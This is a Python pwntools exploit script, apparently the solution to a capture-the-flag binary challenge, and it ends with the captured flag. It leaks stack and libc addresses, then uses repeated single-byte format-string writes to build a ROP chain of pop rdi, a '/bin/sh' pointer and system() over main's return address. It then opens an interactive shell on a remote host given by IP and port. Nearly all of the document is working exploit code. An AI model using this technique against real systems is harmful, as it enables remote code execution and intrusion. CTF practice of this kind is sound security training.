#!/usr/bin/env python3.8

from pwn import *
import warnings
import re

# Allows you to switch between local/GDB/remote from terminal
def connect():
    if args.GDB:
        r = gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.REMOTE:
        r = remote("34.70.212.151", 8003)
    else:
        r = process([elf.path])
    return r

# Specify GDB script here (breakpoints etc)
gdbscript = """
    set follow-fork-mode child
    start
    b *vuln+137
    b *main+159
"""

# Binary filename
exe = "./challenge_patched"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "info"
warnings.filterwarnings(
    "ignore",
    category=BytesWarning,
    message="Text is not bytes; assuming ASCII, no guarantees.",
)

# =======================
# EXPLOIT AFTER THIS
# =======================
r = connect()
libc = ELF("./libc.so.6", checksec=False)

r.sendlineafter(b">> ", "1")
resp = r.recvline().strip()
print(resp)

stack_addr = int(resp.split(b" ")[0], 16)
fgets = int(resp.split(b" ")[1], 16)
# print(f"stack address: {hex(stack_addr)}, fgets: {hex(fgets)}")

offset = 6
POP_RDI_OFFSET = 0x2A3E5  # offset of "pop rdi ; ret" in libc
RET_OFFSET = 0x29139  # offset of "ret" in libc

BINSH = stack_addr + 176  # write "/bin/sh" here
MAIN_RET = (
    stack_addr + 56
)  # overwrite this address to address of "pop rdi; ret" instruction
BINSH_Location = MAIN_RET + 8  # overwrite this address to address of "/bin/sh"
RET_Location = MAIN_RET + 16  # overwrite this address to address of "ret" instruction
SYSTEM_Location = MAIN_RET + 24  # overwrite this address to address of "system()" call

libc.addr = fgets - libc.symbols["fgets"]
POP_RDI = libc.addr + POP_RDI_OFFSET
RET = libc.addr + RET_OFFSET
SYSTEM = libc.addr + libc.symbols["system"]

# print(f"/bin/sh: {hex(BINSH)}, Main return: {hex(MAIN_RET)}, Pointer to /bin/sh: {hex(BINSH_Location)}")
# print(f"Libc base: {hex(libc.addr)}, RET: {hex(RET)}, POP_RDI: {hex(POP_RDI)}, SYSTEM: {hex(SYSTEM)}")

# payload = fmtstr_payload(offset, {location : value})
def make_and_send_payload(offset, where, what, size):
    payload = fmtstr_payload(offset, {where: what}, write_size=size)
    r.sendlineafter(b">> ", "2")
    # print(f"Wrote: {what}")
    r.sendlineafter(b">> ", payload)

# write /bin/sh to stack location BINSH
print(f"WRITING /bin/sh to {hex(BINSH)}")
make_and_send_payload(offset, BINSH, b"/", "byte")
make_and_send_payload(offset, BINSH + 1, b"b", "byte")
make_and_send_payload(offset, BINSH + 2, b"i", "byte")
make_and_send_payload(offset, BINSH + 3, b"n", "byte")
make_and_send_payload(offset, BINSH + 4, b"/", "byte")
make_and_send_payload(offset, BINSH + 5, b"s", "byte")
make_and_send_payload(offset, BINSH + 6, b"h", "byte")
make_and_send_payload(offset, BINSH + 7, b"\x00", "byte")

# write address of POP_RDI_RET in libc to MAIN_RET on stack
print(f"WRITING address of POP_RDI_RET ({hex(POP_RDI)}) on stack at {hex(MAIN_RET)}")
make_and_send_payload(offset, MAIN_RET, bytes.fromhex(hex(POP_RDI)[2:])[-1], "byte")
make_and_send_payload(offset, MAIN_RET + 1, bytes.fromhex(hex(POP_RDI)[2:])[-2], "byte")
make_and_send_payload(offset, MAIN_RET + 2, bytes.fromhex(hex(POP_RDI)[2:])[-3], "byte")
make_and_send_payload(offset, MAIN_RET + 3, bytes.fromhex(hex(POP_RDI)[2:])[-4], "byte")
make_and_send_payload(offset, MAIN_RET + 4, bytes.fromhex(hex(POP_RDI)[2:])[-5], "byte")
make_and_send_payload(offset, MAIN_RET + 5, bytes.fromhex(hex(POP_RDI)[2:])[-6], "byte")

# write address of /bin/sh (BINSH) to BINSH_Location on stack
print(f"WRITING address of /bin/sh to {hex(BINSH_Location)}")
make_and_send_payload(offset, BINSH_Location, bytes.fromhex(hex(BINSH)[2:])[-1], "byte")
make_and_send_payload(
    offset, BINSH_Location + 1, bytes.fromhex(hex(BINSH)[2:])[-2], "byte"
)
make_and_send_payload(
    offset, BINSH_Location + 2, bytes.fromhex(hex(BINSH)[2:])[-3], "byte"
)
make_and_send_payload(
    offset, BINSH_Location + 3, bytes.fromhex(hex(BINSH)[2:])[-4], "byte"
)
make_and_send_payload(
    offset, BINSH_Location + 4, bytes.fromhex(hex(BINSH)[2:])[-5], "byte"
)
make_and_send_payload(
    offset, BINSH_Location + 5, bytes.fromhex(hex(BINSH)[2:])[-6], "byte"
)

# write address of RET in libc to RET_Location on stack
print(f"WRITING address of RET ({hex(RET)}) on stack at {hex(RET_Location)}")
make_and_send_payload(offset, RET_Location, bytes.fromhex(hex(RET)[2:])[-1], "byte")
make_and_send_payload(offset, RET_Location + 1, bytes.fromhex(hex(RET)[2:])[-2], "byte")
make_and_send_payload(offset, RET_Location + 2, bytes.fromhex(hex(RET)[2:])[-3], "byte")
make_and_send_payload(offset, RET_Location + 3, bytes.fromhex(hex(RET)[2:])[-4], "byte")
make_and_send_payload(offset, RET_Location + 4, bytes.fromhex(hex(RET)[2:])[-5], "byte")
make_and_send_payload(offset, RET_Location + 5, bytes.fromhex(hex(RET)[2:])[-6], "byte")

# write address of SYSTEM in libc to SYSTEM_Location on stack
print(f"WRITING address of system() ({hex(SYSTEM)}) on stack at {hex(SYSTEM_Location)}")
make_and_send_payload(
    offset, SYSTEM_Location, bytes.fromhex(hex(SYSTEM)[2:])[-1], "byte"
)
make_and_send_payload(
    offset, SYSTEM_Location + 1, bytes.fromhex(hex(SYSTEM)[2:])[-2], "byte"
)
make_and_send_payload(
    offset, SYSTEM_Location + 2, bytes.fromhex(hex(SYSTEM)[2:])[-3], "byte"
)
make_and_send_payload(
    offset, SYSTEM_Location + 3, bytes.fromhex(hex(SYSTEM)[2:])[-4], "byte"
)
make_and_send_payload(
    offset, SYSTEM_Location + 4, bytes.fromhex(hex(SYSTEM)[2:])[-5], "byte"
)
make_and_send_payload(
    offset, SYSTEM_Location + 5, bytes.fromhex(hex(SYSTEM)[2:])[-6], "byte"
)

r.sendlineafter(b">> ", "3")

r.interactive()

# flag{F0rm47_5tr1ng5_4r3_7o0_3asy}
